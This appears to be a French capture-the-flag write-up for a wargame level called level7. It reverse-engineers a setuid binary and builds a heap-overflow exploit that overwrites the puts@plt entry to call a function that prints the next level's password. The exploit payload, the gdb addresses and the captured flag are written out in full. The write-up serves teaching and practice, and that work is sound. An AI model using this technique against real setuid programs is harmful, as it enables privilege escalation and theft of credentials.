Je commence par découvrir qui je suis, où je suis, et qu'est-ce qui est à ma disposition :

```bash
$ id && pwd && ls -la
uid=2024(level7) gid=2024(level7) groups=2024(level7),100(users)
/home/user/level7
total 17
dr-xr-x---+ 1 level7 level7   80 Mar  9  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level7 level7  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level7 level7 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level8 users  5648 Mar  9  2016 level7
-rw-r--r--+ 1 level7 level7   65 Sep 23  2015 .pass
-rw-r--r--  1 level7 level7  675 Apr  3  2012 .profile
```

Je tente de lancer le binaire level7 :

```bash
$ ./level7
Segmentation fault (core dumped)
$ ./level7 da
Segmentation fault (core dumped)
$ ./level7 da b
~~
```

Je recoupe l'analyse ASM du binaire avec GDB des résultats obtenus sur [Dogbolt](https://dogbolt.org/?id=41a50d3a-4820-48a6-93d8-d314911b1399) et en extrait une version probable du code :

```c
struct file {
    int id;
    void *ptr;
};

char string[80];

void m() {
    printf("%s - %d\n", string, time(0));
    return;
}

int main(int argc, char **argv)
{
    struct file *buffer1;
    struct file *buffer2;

    buffer1 = malloc(8)
    buffer1->id = 1;
    buffer1->ptr = malloc(8);

    buffer2 = malloc(8);
    buffer2->id = 2;
    buffer2->ptr = malloc(8);

    strcpy(buffer2->ptr, argv[1]);
    strcpy(buffer2->ptr, argv[2]);

    fgets(string, 68, fopen("/home/user/level8/.pass", "r"));

    puts("~~");
    
    return 0;
}
```

Je note :

- l'usage de `strcpy()` qui peut présenter une vulnérabilité comme dans le level précédent.
- l'usage de `fgets()` qui à priori est comme précédamment, non exploitable.
- un `puts()` sans importance, à priori.

Je travaille, comme dans le précédent niveau, avec la `heap` étant donné la présence des `malloc()`.

Pour comprendre ce que je dois fabriquer comme payload, je décerne ce que fait le binaire :

- Créé deux structure "fichier" de 8 bytes qui contiennent un `id` les représentants, ainsi qu'un pointeur sur la `heap` pointant vers eux.
- Copie dans chacun de ces "fichier" (avec leurs pointeurs) le contenu du premier et second argument respectivement.
- Tente d'ouvrir le fichier `.pass`, en lire les 68 premiers bytes, et les stock dans la variable global 'string'

Je note également :

- Il ne semble pas utiliser la variable `int` de cette structure, cependant elle servira peut-être dans l'exploit
- La fonction `m()` et son `printf()`, qui imprime la valeur de la globale `string`

Après réflexion et en analysant un point de vulnérabilité possible, il me semble évident que `puts()` n'est en fait pas sans importance comme annoncé plus haut. J'en arrive à cette conclusion car c'est la dernière exécution dans le programme avant sa fin, et après avoir obtenu la valeur contenu dans le `.pass`.

Je vais donc employer la même méthode que dans le précédent niveau, mon but va être de changer ce vers quoi le `plt` de `puts()` pointe, afin de le faire pointer vers `m()` et que le `printf()` m'imprime la valeur de `string` après que celui-ci ai été actualisé pour contenir le `.pass`.

Ma méthode pour réaliser cet exploit va être la suivante :

- Au moment du `strcpy()` pour le `buf1->ptr`, je dois lui donner en argument un payload infecté qui overflow la `heap` jusqu'à atteindre la position de `buf2->ptr`.
- Une fois la position du deuxième buffer atteint, je lui fais valoir l'adresse `plt` de `puts()`
- Au moment du `strcpy()` pour le `buf2->ptr`, je manipule alors ce que l'adresse `plt` de `puts()` vaut, et il me suffit de lui faire résoudre à l'adresse de la fonction `m()`.

Je commence par trouver l'adresse de la fonction `m()` avec `gdb` :

```h
$ gdb level7
(gdb) disas m
Dump of assembler code for function m:
   0x080484f4 <+0>:     push   %ebp <----- ici
   0x080484f5 <+1>:     mov    %esp,%ebp
   0x080484f7 <+3>:     sub    $0x18,%esp
    ...
```

Je trouve `m()` -> `0x080484f4`.

Je cherche maintenant l'adresse `plt` de `puts()` :

```h
(gdb) disas puts
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:     jmp    *0x8049928 <------- ici
   0x08048406 <+6>:     push   $0x28
   0x0804840b <+11>:    jmp    0x80483a0
```

Je trouve `puts` -> `0x8049928`.

Il me faut maintenant trouver l'offset à appliquer afin de faire pointer `buf2->ptr` sur `buf1->ptr`.

Comme pour le level 6, j'utilise `ltrace` afin de trouver la distance à "parcourir" dans la `heap` avant d'overflow :

```bash
$ ltrace ./level7 da b
__libc_start_main(0x8048521, 3, 0xbffff7f4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                               = 0x0804a008 (buf1 = malloc(8))
malloc(8)                               = 0x0804a018 (buf1->ptr = malloc(8))
malloc(8)                               = 0x0804a028 (buf2 = malloc(8))
malloc(8)                               = 0x0804a038 (buf2->ptr = malloc(8))
strcpy(0x0804a018, "da")                = 0x0804a018
strcpy(0x0804a038, "b")                 = 0x0804a038
fopen("/home/user/level8/.pass", "r")   = 0
fgets( <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

Avec ces informations je trouve le padding en faisant le calcul suivant :

- Je pars de `buf1->ptr` => `0x0804a018`
- J'arrive à `buf2` => `0x0804a028`
- Je trouve [16 bytes](https://www.calculator.net/hex-calculator.html?number1=0804a028&c2op=-&number2=0804a018&calctype=op&x=Calculate)
- Je dois ajouter 4 bytes pour l'`int` qui est déclaré dans la structure
- `16 + 4 = 20` bytes
- J'atteint donc normalement `buf2->ptr`

---

On note l'importance d'inclure les 4 bytes de l'`int` en observant dans la `ltrace` ci-dessus que :

`malloc(8) = 0x0804a028 (buf2 = malloc(8))`
et
`malloc(8) = 0x0804a038 (buf2->ptr = malloc(8))`

Sont séparé de 0x10 (soit 16 bytes). L'adresse que l'on trouve en deuxième (`0x0804a038`) représente le haut des 8 bytes alloués à `buf2->ptr`.
Son adresse avant l'allocation est donc de `0x0804a038` - `0x00000008` soit `0x0804a030`.

Si j'ajoute à l'adresse de `buf2` (`0x0804a028`) 4 bytes (pour représenter `buf2->id`) j'atteint `0x0804a02c` (soit l'adresse de `buf2->ptr`)
et si j'ajoute à nouveau 4 bytes, j'atteint le début des 8 bytes alloués pour `buf2->ptr`, soit `0x0804a030` !

---

Je peux maintenant construire mon payload avec ces 3 informations :

- Adresse de `m()` => `0x080484f4` => `\x08\x04\x84\xf4"[::-1]` en python
- Adresse de `puts@plt` => `0x8049928` => `\x08\x04\x99\x28"[::-1]` en python
- Padding pour `buf1->ptr` => 20 bytes => `\x90" * 20`

Voici à quoi pourrait ressembler le payload :

```python
python -c 'print("\x90" * 20 + "\x08\x04\x99\x28"[::-1])'` `python -c 'print("\x08\x04\x84\xf4"[::-1])
```

Pour résumer, le premier argument va donner une valeur à `buf1->ptr`, je lui donne la valeur de 20 bytes de padding en `NOP` (`\x90`) afin qu'il pointe sur l'adresse de `buf2->ptr`, et je fais équivaloir cette dernière à l'adresse de `puts@plt`.

Le deuxième argument va lui donner une valeur à `buf2->ptr` qui ici, en fait, pointe sur `puts@plt`. Nous allons donc, comme le niveau précédent, changer ce vers quoi pointe `puts()`.

Cela aura pour effet qu'au moment du `fgets()`, la variable globale `string` sera modifiée, puis `m` sera apppelé par le code pensant appeler `puts()`, et imprimera cette valeur.

J'essaye mon payload :

```bash
$ ./level7 `python -c 'print("\x90"*20 + "\x08\x04\x99\x28"[::-1])'` `python -c 'print("\x08\x04\x84\xf4"[::-1])'`
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1712765813
```

On voit ici que le `printf()` à bien été imprimé, et je comprend maintenant l'utilité du `time(0)` dans ce dernier. Il permet de vérifier que le projet à bien été réalisé par nos soins !

Je regarde la valeur d'`epoch` actuelle sur [epochconverter.com](https://www.epochconverter.com/) et trouve : `1712765926`
Je soustrais par curiosité les deux valeurs : `1712765926 - 1712765813 = 113`.

Il s'est donc écoulé 113 secondes depuis l'exécution de mon payload et l'écriture du calcul ci-dessus :)



